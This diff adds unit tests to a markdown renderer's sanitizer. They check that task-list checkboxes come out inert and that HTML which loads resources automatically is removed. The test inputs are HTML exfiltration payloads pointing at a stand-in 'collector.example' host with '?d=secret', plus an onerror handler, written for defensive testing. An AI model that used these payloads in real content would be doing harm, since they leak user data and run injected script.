@@ -107,6 +107,53 @@ describe('renderMarkdown', () => {
     }
   });
 
+  it.each([
+    '<input type="image" src="https://collector.example/input?d=secret">',
+    '<table background="https://collector.example/table?d=secret"><tr><td>x</td></tr></table>',
+    '<table><tr><td background="https://collector.example/cell?d=secret">x</td></tr></table>',
+    '<audio src="https://collector.example/audio?d=secret" autoplay></audio>',
+    '<video><source src="https://collector.example/video?d=secret"><track src="https://collector.example/track?d=secret"></video>',
+    '<math><mglyph src="https://collector.example/math?d=secret"></mglyph></math>',
+    '<svg><image xlink:href="https://collector.example/svg?d=secret"></image></svg>',
+    '<div style="background-image: url(https://collector.example/css?d=secret)">x</div>',
+  ])('removes automatic resource loading from raw HTML: %s', (markdown) => {
+    const dom = intoDom(markdown);
+    expect(dom.querySelector('img, input[type="image"], audio, video, source, track, svg, math')).toBeNull();
+    expect(dom.querySelector('[src], [srcset], [background], [poster], [style]')).toBeNull();
+    expect(dom.innerHTML).not.toContain('collector.example');
+  });
+
+  it('preserves disabled GFM task-list checkboxes', () => {
+    const dom = intoDom('- [x] completed\n- [ ] pending');
+    const inputs = dom.querySelectorAll('input');
+    expect(inputs).toHaveLength(2);
+    expect(inputs[0]?.checked).toBe(true);
+    expect(inputs[1]?.checked).toBe(false);
+    for (const input of inputs) {
+      expect(input.type).toBe('checkbox');
+      expect(input.disabled).toBe(true);
+    }
+  });
+
+  it('makes raw checkboxes inert and strips resource attributes', () => {
+    const dom = intoDom('<input type="checkbox" checked src="https://collector.example/check?d=secret">');
+    const input = dom.querySelector('input');
+    expect(input?.checked).toBe(true);
+    expect(input?.disabled).toBe(true);
+    expect(input?.hasAttribute('src')).toBe(false);
+  });
+
+  it('rewrites raw images without preserving srcset or event handlers', () => {
+    const dom = intoDom('<img src="https://images.example/pic" srcset="https://collector.example/set?d=secret 2x" alt="picture" onerror="alert(1)">');
+    const link = dom.querySelector('a');
+    expect(link?.getAttribute('href')).toBe('https://images.example/pic');
+    expect(link?.textContent).toBe('picture');
+    expect(link?.getAttribute('target')).toBe('_blank');
+    expect(link?.getAttribute('rel')).toContain('noreferrer');
+    expect(dom.querySelector('img, [src], [srcset], [onerror]')).toBeNull();
+    expect(dom.innerHTML).not.toContain('collector.example');
+  });
+
   it('does not throw on partial/incomplete markdown (streaming-friendly)', () => {
     // half-typed table, unterminated bold, dangling fence, open link
     const partials = [
